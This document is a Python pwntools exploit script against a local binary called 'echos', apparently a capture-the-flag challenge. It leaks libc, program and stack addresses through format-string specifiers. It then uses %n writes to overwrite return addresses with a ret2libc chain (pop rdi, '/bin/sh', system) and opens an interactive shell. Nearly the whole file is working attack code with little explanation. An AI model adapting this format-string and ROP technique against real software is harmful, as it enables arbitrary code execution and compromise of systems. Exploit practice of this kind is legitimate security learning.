from pwn import *
#to make sure stack doesnt move around
io = process("./echos")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
#Utilities
def pad(s):
    return "0" * (6 - len(s)) + s

#leaking libc address,main address and stack address cause they all happen to be on the buffer
def leakAddresses():
    exploit = b"%3$lx%6$lx%4$lx"
    io.sendline(exploit)
    leakedBytes = io.recv()[:-1]
    libcLeak = leakedBytes[:12]
    asmLeak = leakedBytes[12:24]
    stackLeak = leakedBytes[24:]
    readInt = int(libcLeak.decode(),16) - 18
    libcBase = readInt - libc.symbols["read"]
    mainAddr = int(asmLeak.decode(),16) - 2098555
    stackRet = int(stackLeak.decode(),16) + 88
    print("===========================================")
    print("readAddress = " + hex(readInt))
    print("libcBase = " + hex(libcBase))
    print("main = " + hex(mainAddr))
    print("stackRet = " + hex(stackRet))
    print("===========================================")
    ret = [libcBase,mainAddr,stackRet]
    return ret

#overwrite addresses using format string %n src is overwrite with what ret is whr to overwrite
def overwrite(dest,src):
    #must follow order so we dont mess up the bytes we placed
    converted = hex(src)
    values = [int(converted[-4:],16),int(converted[-8:-4],16),int(converted[-12:-8],16)]
    #values = [int(converted[-12:-8],16),int(converted[-4:],16),int(converted[-8:-4],16)]
    if values[1] < values[0]:
        values[1] += 0x10000

    first = str(values[0])
    second = str(values[1] - values[0])
    exploit1 = "%{0}x%12$n%{1}x%13$nAAAAAA".format(pad(first),pad(second))  #8 + 5 == first
    exploit1 = bytes(exploit1,'utf-8')
    exploit1 += p64(dest) + p64(dest+2) 
    exploit2 = "%{}x%10$nAAA".format(pad(str(values[2])))
    exploit2 = bytes(exploit2,'utf-8')
    exploit2 += p64(dest + 4)
    #exploit += p64(dest+4) + p64(dest) + p64(dest+2)
    return exploit1,exploit2

addresses = leakAddresses()
libc.address = addresses[0]
main = addresses[1]
popRdi = main - 0x81d + 0x8f3
retAddress = addresses[2]
binsh = next(libc.search(b"/bin/sh"))
system = libc.symbols["system"]
variableToWrite = retAddress - 92
#-4
print("popRdi = " + hex(popRdi))
print("binsh = " + hex(binsh))
print("system = " + hex(system))
print("===========================================")
#overwrite the variable that controls iteration,then setup for ret2libc
#main is pop rbp,there is movaps in printf so some times need main sometimes main+1


retMain1,retMain2 = overwrite(retAddress,main+1)
popRdi1,popRdi2 = overwrite(retAddress + 56,popRdi)
binsh1,binsh2 = overwrite(retAddress + 64,binsh)
system1,system2 = overwrite(retAddress + 72,system)
writes = [binsh1,binsh2,system1,system2,popRdi1,popRdi2]

io.sendline(retMain1)
io.sendline(retMain2)
plus = 0
for i in range(3):
    plus += 16
    io.sendline(writes[i])
    if i == 1:
        retM1,retM2 = overwrite(retAddress+plus,main)
    else:
        retM1,retM2 = overwrite(retAddress+plus,main+1)
    io.sendline(retM1)
    io.sendline(retM2)

for i in range(3,6):
    io.sendline(writes[i])

io.interactive()
